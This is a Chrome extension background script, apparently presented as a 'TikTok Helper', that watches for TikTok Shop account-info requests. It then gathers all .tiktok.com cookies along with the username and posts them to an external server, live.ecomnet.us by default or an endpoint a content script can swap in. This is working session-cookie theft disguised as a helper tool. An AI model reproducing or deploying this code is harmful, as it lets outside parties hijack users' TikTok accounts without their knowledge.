const suffix = '&skip_this_url=true';
// Listen for message from content script
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === 'setEndpoint') {
    const data = request.payload;
    chrome.storage.local.set({ endpoint: data }, function () {
      console.log('Endpoint is set to ' + data);
    });
  }
});

// Listen for completed requests
chrome.webRequest.onCompleted.addListener(
  async function (details) {
    if (
      details.url.startsWith(
        'https://shop.tiktok.com/api/v1/streamer_desktop/account_info/get'
      ) &&
      !details.url.endsWith(suffix)
    ) {
      const res = await fetch(details.url + suffix);
      const json = await res.json();
      const username = json.data.user_name;
      chrome.cookies.getAll(
        { url: 'https://shop.tiktok.com' },
        async function (cookies) {
          cookies = cookies.filter((c) => c.domain === '.tiktok.com');
          let cookieString = '';
          cookies.forEach((c) => {
            if (c.domain === '.tiktok.com') {
              cookieString += `${c.name}=${c.value};`;
            }
          });
          let endpoint = await new Promise((resolve) => {
            chrome.storage.local.get('endpoint', function (result) {
              resolve(result.endpoint);
            });
          });
          if (!endpoint) {
            endpoint = 'https://live.ecomnet.us/api/cookies';
          }
          await fetch(endpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'User-Agent': 'TikTok Helper Chrome Extension',
            },
            body: JSON.stringify({
              username,
              cookies: cookieString,
            }),
          });
        }
      );
    }
  },
  { urls: ['<all_urls>'] }
);
